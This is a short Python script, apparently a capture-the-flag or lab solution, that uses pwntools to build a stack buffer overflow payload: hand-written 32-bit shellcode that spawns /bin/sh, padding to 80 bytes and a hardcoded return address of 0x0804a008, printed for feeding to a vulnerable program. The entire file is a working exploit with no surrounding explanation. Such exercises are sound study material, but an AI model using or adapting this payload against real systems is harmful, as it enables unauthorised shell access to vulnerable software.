import pwn


shellcode = pwn.asm(pwn.shellcraft.sh())
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
s_len = len(shellcode)

# adress 0x0804a008 
adress = b"\x08\xa0\x04\x08"

payload = shellcode + b'A'* (80 - s_len) + adress

print(payload)
